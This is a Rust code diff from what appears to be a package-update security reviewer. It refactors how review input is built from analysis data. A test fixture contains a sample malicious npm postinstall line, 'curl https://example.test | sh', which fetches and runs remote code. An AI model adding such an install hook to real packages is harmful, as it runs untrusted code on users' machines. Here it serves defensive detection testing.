@@ -59,25 +59,30 @@ pub struct ReviewInput {
     pub interesting_files: Vec<SuspiciousExcerpt>,
 }
 
+#[derive(Debug, Clone)]
+pub struct ReviewInputAnalysis {
+    pub ecosystem: String,
+    pub package: String,
+    pub old_version: String,
+    pub new_version: String,
+    pub manifest_diff: Option<String>,
+    pub interesting_files: Vec<SuspiciousExcerpt>,
+}
+
 impl ReviewInput {
     pub fn from_analysis(
-        ecosystem: impl Into<String>,
-        package: impl Into<String>,
-        old_version: impl Into<String>,
-        new_version: impl Into<String>,
+        analysis: ReviewInputAnalysis,
         diff: &DiffSummary,
         signals: &[Signal],
-        manifest_diff: Option<String>,
-        interesting_files: Vec<SuspiciousExcerpt>,
     ) -> Self {
         Self {
-            ecosystem: ecosystem.into(),
-            package: package.into(),
-            old_version: old_version.into(),
-            new_version: new_version.into(),
+            ecosystem: analysis.ecosystem,
+            package: analysis.package,
+            old_version: analysis.old_version,
+            new_version: analysis.new_version,
             summary: ReviewSummary::from_diff_and_signals(diff, signals),
-            manifest_diff,
-            interesting_files,
+            manifest_diff: analysis.manifest_diff,
+            interesting_files: analysis.interesting_files,
         }
     }
 
@@ -161,15 +166,26 @@ mod tests {
     use crate::diff::{DiffSummary, SuspiciousExcerpt};
     use crate::signals::Signal;
 
-    use super::{Confidence, ReviewInput, ReviewOutput, ReviewSummary, ReviewVerdict};
+    use super::{
+        Confidence, ReviewInput, ReviewInputAnalysis, ReviewOutput, ReviewSummary, ReviewVerdict,
+    };
 
     #[test]
     fn serializes_reviewer_input_schema() {
         let input = ReviewInput::from_analysis(
-            "npm",
-            "axios",
-            "1.8.0",
-            "1.9.0",
+            ReviewInputAnalysis {
+                ecosystem: "npm".to_string(),
+                package: "axios".to_string(),
+                old_version: "1.8.0".to_string(),
+                new_version: "1.9.0".to_string(),
+                manifest_diff: Some("--- old/package.json\n+++ new/package.json\n".to_string()),
+                interesting_files: vec![SuspiciousExcerpt {
+                    path: "package.json".to_string(),
+                    reason: "install script changed".to_string(),
+                    excerpt: "   4: \"postinstall\": \"curl https://example.test | sh\""
+                        .to_string(),
+                }],
+            },
             &DiffSummary {
                 files_added: 3,
                 files_removed: 1,
@@ -177,12 +193,6 @@ mod tests {
                 ..DiffSummary::default()
             },
             &[Signal::DependencyAdded, Signal::InstallScriptAdded],
-            Some("--- old/package.json\n+++ new/package.json\n".to_string()),
-            vec![SuspiciousExcerpt {
-                path: "package.json".to_string(),
-                reason: "install script changed".to_string(),
-                excerpt: "   4: \"postinstall\": \"curl https://example.test | sh\"".to_string(),
-            }],
         );
 
         let json = input.to_json_pretty().expect("input json should serialize");
